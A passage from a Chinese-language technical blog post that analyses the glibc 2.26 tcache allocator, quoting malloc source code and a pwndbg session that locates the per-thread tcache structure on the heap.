25..40 or 13..20</span></span><br><span class="line"><span class="comment">   idx 2   bytes 41..56 or 21..28</span></span><br><span class="line"><span class="comment">   etc.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* This is another arbitrary limit, which tunables can change.  Each</span></span><br><span class="line"><span class="comment">   tcache bin will hold at most this number of chunks.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_FILL_COUNT 7</span></span><br></pre></td></tr></table></figure><h1 id="生成与调试"><a href="#生成与调试" class="headerlink" title="生成与调试"></a>生成与调试</h1><p>这部分应该写在下一部分，不过在我刚开始动手调试时就遇到了问题，就是 __thread 变量的问题，这个变量是线程内访问的，所以当我在gdb中使用  <strong>p tcache</strong> 命令输出结构体时出现了错误：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cannot find thread-local storage <span class="keyword">for</span> process 27690, shared library /lib/x86_64-linux-gnu/libc.so.6:</span><br><span class="line">Cannot find thread-local variables on this target</span><br></pre></td></tr></table></figure><p>就很懵，调试时不能查看结构体数值不就很蛋疼么。。。然后在博客内请教了大佬，还没回我，我就继续分析代码，找到了解决问题的方法（<em>如果有人知道如何直接查看，麻烦告知我</em>）</p><p>在代码中发现了一个初始化函数 tcache_init()</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">tcache_init(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">size_t</span> bytes = <span class="keyword">sizeof</span> (tcache_perthread_struct);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (tcache_shutting_down)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In a low memory situation, we may not be able to allocate memory</span></span><br><span class="line"><span class="comment">     - in which case, we just keep trying later.  However, we</span></span><br><span class="line"><span class="comment">     typically do this very early, so either there is sufficient</span></span><br><span class="line"><span class="comment">     memory, or there isn't enough memory to do non-trivial</span></span><br><span class="line"><span class="comment">     allocations anyway.  */</span></span><br><span class="line">  <span class="keyword">if</span> (victim)</span><br><span class="line">    &#123;</span><br><span class="line">      tcache = (tcache_perthread_struct *) victim;</span><br><span class="line">      <span class="built_in">memset</span> (tcache, <span class="number">0</span>, <span class="keyword">sizeof</span> (tcache_perthread_struct));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现tcache是一个指针，而内存块居然是用_int_malloc生成的，这就是说我们可以不管这个线程局部变量，直接去找这块内存就好了。</p><p>继续跟踪函数调用，过程是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">malloc</span><br><span class="line">__libc_malloc</span><br><span class="line">          MAYBE_INIT_TCACHE</span><br><span class="line">              tcache_init</span><br></pre></td></tr></table></figure><p>而MAYBE_INIT_TCACHE的位置在arena_get之前，并且tcache_init中还包含arena_get函数。结合上一篇对于内存堆分配区的知识，这就可以判断，在对线程的分配区初始化之后，第一个分配的内存就是tcache内存块。</p><p>在主分配区该结构是heap段第一块内存，在非主分配应该在sub_heap和thread_state结构体以后</p><p>因此首先用<strong>vmmap</strong> 找到heap地址之后，就可以查看该结构体内容了，进而可以继续调试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x555555554000     0x555555555000 r-xp     1000 0      /home/p4nda/Desktop/1</span><br><span class="line">    0x555555754000     0x555555755000 r--p     1000 0      /home/p4nda/Desktop/1</span><br><span class="line">    0x555555755000     0x555555756000 rw-p     1000 1000   /home/p4nda/Desktop/1</span><br><span class="line">    0x555555756000     0x555555777000 rw-p    21000 0      [heap]</span><br><span class="line">    0x7ffff79f5000     0x7ffff7bcb000 r-xp   1d6000 0      /lib/x86_64-linux-gnu/libc-2.26.so</span><br><span class="line">    0x7ffff7bcb000     0x7ffff7dcb000 ---p   200000 1d6000 /lib/x86_64-linux-gnu/libc-2.26.so</span><br><span class="line">    0x7ffff7dcb000     0x7ffff7dcf000 r--p     4000 1d6000 /lib/x86_64-linux-gnu/libc-2.26.so</span><br><span class="line">    0x7ffff7dcf000     0x7ffff7dd1000 rw-p     2000 1da000 /lib/x86_64-linux-gnu/libc-2.26.so</span><br><span class="line">    0x7ffff7dd1000     0x7ffff7dd5000 rw-p     4000 0      </span><br><span class="line">    0x7ffff7dd5000     0x7ffff7dfc000 r-xp    27000 0      /lib/x86_64-linux-gnu/ld-2.26.so</span><br><span class="line">    0x7ffff7fe0000     0x7ffff7fe2000 rw-p     2000 0      </span><br><span class="line">    0x7ffff7ff7000     0x7ffff7ffa000 r--p     3000 0      [vvar]</span><br><span class="line">    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]</span><br><span class="line">    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 27000  /lib/x86_64-linux-gnu/ld-2.26.so</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 28000  /lib/x86_64-linux-gnu/ld-2.26.so</span><br><span class="line">    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      </span><br><span class="line">    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]</span><br><span class="line">pwndbg&gt; p *(struct tcache_perthread_struct *)0x555555756000</span><br><span class="line">$1 = &#123;</span><br><span class="line">  counts = &quot;\000\000\000\000\000\000\000\000Q\002&quot;, &apos;\000&apos; &lt;repeats 53 times&gt;, </span><br><span class="line">  entries = &#123;0x0 &lt;repeats 64 times&gt;&#125;</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><h1 id="堆分配差异"><a href="#堆分配差异" class="headerlink" title="堆分配差异"></a>堆分配差异</h1><p>当加入了tcache机制后，原来的ptmalloc的堆块释放与分配机制存在一定的改变，先看两个函数tcache_get、tcache_put，可以看出这两个函数与fastbin的取出和插入基本完全一样。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there's</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="内存块放入tcache"><a href="#内存块放入tcache" class="headerlink" title="内存块放入tcache"></a>内存块放入tcache</h2><h3 id="内存释放"><a href="#内存释放" class="headerlink" title="内存释放"></a>内存释放</h3><p>可以看到，在free函数的最先处理部分，首先是检查释放块是否页对齐及前后堆块的释放情况，便优先放入tcache结构中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T size;        <span class="comment">/* its size */</span></span><br><span class="line">  mfastbinptr *fb;             <span class="comment">/* associated fastbin */</span></span><br><span class="line">  mchunkptr nextchunk;         <span class="comment">/* next contiguous chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T nextsize;    <span class="comment">/* its size */</span></span><br><span class="line">  <span class="keyword">int</span> nextinuse;               <span class="comment">/* true if nextchunk is used */</span></span><br><span class="line">  INTERNAL_SIZE_T prevsize;    <span class="comment">/* size of previous contiguous chunk */</span></span><br><span class="line">  mchunkptr bck;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr fwd;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line">  size = chunksize (p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Little security check which won't hurt performance: the</span></span><br><span class="line"><span class="comment">     allocator never wrapps around at the end of the address space.</span></span><br><span class="line"><span class="comment">     Therefore we can exclude some size values which might appear</span></span><br><span class="line"><span class="comment">     here by accident or by "design" from some intruder.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">"free(): invalid pointer"</span>);</span><br><span class="line">  <span class="comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span></span><br><span class="line"><span class="comment">     multiple of MALLOC_ALIGNMENT.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">    malloc_printerr (<span class="string">"free(): invalid size"</span>);</span><br><span class="line"></span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">&amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line">&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">      &#123;</span><br><span class="line">tcache_put (p, tc_idx);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="内存申请"><a href="#内存申请" class="headerlink" title="内存申请"></a>内存申请</h3><p>在内存分配的malloc函数中有多处，会将内存块移入tcache中。</p><p>首先，申请的内存块符合fastbin大小时并且找到在fastbin内找到可用的空闲块时，会把该fastbin链上的其他内存块放入tcache中。</p><p>其次，申请的内存块符合smallbin大小时并且找到在smallbin内找到可用的空闲块时，会把该smallbin链上的其他内存块放入tcache中。</p><p>还有，当在unsorted bin链上循环处理时，当找到大小合适的链时，并不直接返回，而是先放到tcache中，继续处理。</p><p>（<strong>高能预警：代码经过剪切，仍然很长… </strong>）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *</span><br><span class="line">_int_malloc (mstate av, <span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">... 变量定义 ...</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="keyword">size_t</span> tcache_unsorted_count;    <span class="comment">/* count of unsorted chunks processed */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">...</span><br><span class="line">=======  <span class="number">1.</span>  申请块符合fastbin块大小  ========</span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);</span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">      mchunkptr pp;</span><br><span class="line">      victim = *fb;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    *fb = victim-&gt;fd;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    REMOVE_FB (fb, pp, victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">malloc_printerr (<span class="string">"malloc(): memory corruption (fast)"</span>);</span><br><span class="line">      check_remalloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* While we're here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment"> stash them in the tcache.  */</span></span><br><span class="line">      <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">&#123;</span><br><span class="line">  mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">  <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line"> &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">*fb = tc_victim-&gt;fd;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">=======  <span class="number">2.</span>  申请块符合smallbin块大小  ========</span><br><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">    malloc_printerr (<span class="string">"malloc(): smallbin double linked list corrupted"</span>);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          bin-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we're here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = tc_victim-&gt;bk;</span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  INTERNAL_SIZE_T tcache_nb = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    tcache_nb = nb;</span><br><span class="line">  <span class="keyword">int</span> return_cached = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  tcache_unsorted_count = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">====== 循环处理unsorted bin内存块 ========</span><br><span class="line">  <span class="keyword">for</span> (;; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">......   </span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">......</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (size == nb)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (victim);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* Fill cache first, return to user only if cache fills.</span></span><br><span class="line"><span class="comment"> We may return one of these chunks later.  */</span></span><br><span class="line">      <span class="keyword">if</span> (tcache_nb</span><br><span class="line">  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_put (victim, tc_idx);</span><br><span class="line">  return_cached = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">#endif</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="内存块从tcache中取出"><a href="#内存块从tcache中取出" class="headerlink" title="内存块从tcache中取出"></a>内存块从tcache中取出</h2><h3 id="直接分配"><a href="#直接分配" class="headerlink" title="直接分配"></a>直接分配</h3><p>在内存申请的开始部分，首先会判断申请大小块，在tcache是否存在，如果存在就直接从tcache中摘取，否则再使用_int_malloc分配。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td 